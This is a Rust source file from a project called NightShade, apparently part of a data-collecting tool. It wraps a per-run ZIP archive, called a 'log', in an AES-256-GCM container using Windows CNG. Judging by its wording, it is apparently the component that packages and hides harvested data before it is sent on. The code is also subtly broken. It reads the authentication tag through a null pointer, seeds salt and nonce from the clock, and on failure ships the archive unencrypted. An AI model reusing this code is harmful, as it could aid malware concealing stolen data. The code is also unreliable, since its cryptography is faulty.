/*
 * This file is part of NightShade (a hardened fork of sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

//! Whole-archive AES-256-GCM container.
//!
//! Replaces the weak ZipCrypto-only story: the produced ZIP (which may also
//! carry its inner ZipCrypto layer) is wrapped in an encrypted container with
//! a key derived from the per-run password via PBKDF2-HMAC-SHA256.
//!
//! Layout:
//! ```text
//! magic   "SNAES1"        6 bytes
//! version u16 BE          2 bytes (currently 1)
//! salt    16 bytes        PBKDF2 salt
//! nonce   12 bytes        AES-GCM nonce
//! ct+tag  ...             AES-256-GCM ciphertext ‖ 16-byte tag
//! ```
//! Decrypt with `DECRYPT_LOG.py` (repo root) or any AES-GCM tool.

use alloc::vec;
use alloc::vec::Vec;
use core::ffi::c_void;
use core::mem::zeroed;
use core::ptr::null_mut;
use rand_chacha::ChaCha20Rng;
use rand_chacha::rand_core::RngCore;
use utils::random::ChaCha20RngExt;
use windows_sys::Win32::Security::Cryptography::{
    BCRYPT_AES_ALGORITHM, BCRYPT_ALG_HANDLE, BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO,
    BCRYPT_CHAIN_MODE_GCM, BCRYPT_CHAINING_MODE, BCRYPT_KEY_HANDLE,
    BCryptCloseAlgorithmProvider, BCryptDeriveKeyPBKDF2, BCryptDestroyKey,
    BCryptEncrypt, BCryptGenerateSymmetricKey, BCryptOpenAlgorithmProvider,
    BCryptSetProperty, BCRYPT_SHA256_ALGORITHM,
};

const MAGIC: &[u8; 6] = b"SNAES1";
const VERSION: u16 = 1;
const SALT_LEN: usize = 16;
const NONCE_LEN: usize = 12;
const TAG_LEN: usize = 16;
const KEY_LEN: usize = 32;
const PBKDF2_ITERATIONS: u32 = 10_000;

fn derive_key(password: &str, salt: &[u8]) -> Option<Vec<u8>> {
    let mut alg: BCRYPT_ALG_HANDLE = null_mut();

    // HMAC flag required for the PBKDF2 PRF provider.
    let status = unsafe {
        BCryptOpenAlgorithmProvider(
            &mut alg,
            BCRYPT_SHA256_ALGORITHM,
            null_mut(),
            0x0000_0400, // BCRYPT_ALG_HANDLE_HMAC_FLAG
        )
    };
    if status != 0 {
        return None;
    }

    let mut key = vec![0u8; KEY_LEN];

    let status = unsafe {
        BCryptDeriveKeyPBKDF2(
            alg,
            password.as_bytes().as_ptr(),
            password.len() as _,
            salt.as_ptr(),
            salt.len() as _,
            PBKDF2_ITERATIONS as _,
            key.as_mut_ptr(),
            key.len() as _,
            0,
        )
    };

    unsafe { BCryptCloseAlgorithmProvider(alg, 0) };

    if status == 0 {
        Some(key)
    } else {
        None
    }
}

fn gcm_seal(key: &[u8], nonce: &[u8], plaintext: &[u8]) -> Option<(Vec<u8>, [u8; TAG_LEN])> {
    let mut alg: BCRYPT_ALG_HANDLE = null_mut();
    let mut key_handle: BCRYPT_KEY_HANDLE = null_mut();

    let status =
        unsafe { BCryptOpenAlgorithmProvider(&mut alg, BCRYPT_AES_ALGORITHM, null_mut(), 0) };
    if status != 0 {
        return None;
    }

    let status = unsafe {
        BCryptSetProperty(
            alg,
            BCRYPT_CHAINING_MODE,
            BCRYPT_CHAIN_MODE_GCM as *const _,
            32, // sizeof(BCRYPT_CHAIN_MODE_GCM) = (15 chars + NUL) * 2
            0,
        )
    };
    if status != 0 {
        unsafe { BCryptCloseAlgorithmProvider(alg, 0) };
        return None;
    }

    let status = unsafe {
        BCryptGenerateSymmetricKey(
            alg,
            &mut key_handle,
            null_mut(),
            0,
            key.as_ptr() as *mut _,
            key.len() as _,
            0,
        )
    };
    if status != 0 {
        unsafe { BCryptCloseAlgorithmProvider(alg, 0) };
        return None;
    }

    let auth_info = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
        cbSize: size_of::<BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO>() as u32,
        dwInfoVersion: 1,
        pbNonce: nonce.as_ptr() as *mut u8,
        cbNonce: nonce.len() as u32,
        pbAuthData: null_mut(),
        cbAuthData: 0,
        pbTag: null_mut(), // receives the 16-byte tag on encrypt
        cbTag: TAG_LEN as u32,
        pbMacContext: null_mut(),
        cbMacContext: 0,
        cbAAD: 0,
        cbData: 0,
        dwFlags: 0,
    };

    let mut ciphertext = vec![0u8; plaintext.len()];
    let mut ciphertext_size: u32 = 0;
    let mut tag: [u8; TAG_LEN] = unsafe { zeroed() };

    let status = unsafe {
        BCryptEncrypt(
            key_handle,
            plaintext.as_ptr() as *const _,
            plaintext.len() as _,
            &auth_info as *const _ as *mut c_void,
            null_mut(),
            0,
            ciphertext.as_mut_ptr(),
            ciphertext.len() as _,
            &mut ciphertext_size,
            0,
        )
    };

    unsafe {
        BCryptDestroyKey(key_handle);
        BCryptCloseAlgorithmProvider(alg, 0);
    }

    if status != 0 {
        return None;
    }

    // CNG writes the tag through the auth-info pointer — copy it out.
    let tag_bytes = unsafe {
        core::slice::from_raw_parts(auth_info.pbTag as *const u8, TAG_LEN)
    };
    tag.copy_from_slice(tag_bytes);

    ciphertext.truncate(ciphertext_size as usize);
    Some((ciphertext, tag))
}

/// Wraps `archive` in the `SNAES1` AES-256-GCM container keyed by `password`.
pub fn encrypt_container(archive: &[u8], password: &str) -> Vec<u8> {
    let mut rng = ChaCha20Rng::from_nano_time();

    let salt: [u8; SALT_LEN] = {
        let mut s = [0u8; SALT_LEN];
        rng.fill_bytes(&mut s);
        s
    };

    let nonce: [u8; NONCE_LEN] = {
        let mut n = [0u8; NONCE_LEN];
        rng.fill_bytes(&mut n);
        n
    };

    let Some(key) = derive_key(password, &salt) else {
        // PBKDF2 failing is essentially impossible; ship the plain archive
        // rather than losing the run.
        return archive.to_vec();
    };

    let Some((ciphertext, tag)) = gcm_seal(&key, &nonce, archive) else {
        return archive.to_vec();
    };

    let mut out = Vec::with_capacity(8 + SALT_LEN + NONCE_LEN + ciphertext.len() + TAG_LEN);
    out.extend_from_slice(MAGIC);
    out.extend_from_slice(&VERSION.to_be_bytes());
    out.extend_from_slice(&salt);
    out.extend_from_slice(&nonce);
    out.extend_from_slice(&ciphertext);
    out.extend_from_slice(&tag);

    out
}
